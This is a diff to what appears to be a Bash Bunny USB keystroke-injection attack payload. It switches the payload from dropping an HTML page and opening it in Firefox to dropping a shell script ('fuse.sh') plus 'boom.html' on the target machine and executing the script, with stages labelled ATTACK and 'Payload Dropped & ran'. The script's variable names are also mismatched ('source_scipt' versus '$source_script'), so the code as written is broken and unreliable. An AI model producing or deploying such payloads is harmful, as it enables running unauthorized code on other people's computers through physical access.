@@ -14,21 +14,24 @@
 # | Attack Stage        | Description                              |
 # | ------------------- | ---------------------------------------- |
 # | SETUP               | Open vi                                  |
-# | ATTACK              | Writing HTML                             |
-# | FINISH              | Browser Ready                            |
+# | ATTACK              | Writing files                            |
+# | FINISH              | Payload Dropped & ran (remove the bunny) |
 #
 
 ATTACKMODE HID
 LED SETUP
 
-source_html="/root/udisk/payloads/${SWITCH_POSITION}/index.min.html"
-target_html="~/index.html"
-#date_time=
+source_scipt="/root/udisk/payloads/${SWITCH_POSITION}/fuse.sh"
+target_script="~/fuse.sh"
+
+source_html="/root/udisk/payloads/${SWITCH_POSITION}/boom.html"
+target_html="~/boom.html"
 
 LED ATTACK
 
+DROP $source_script $target_script
 DROP $source_html $target_html
-RUN LINUX "firefox ${target_html}"
+RUN LINUX "${target_script}"
 
 Q ENTER
 LED FINISH
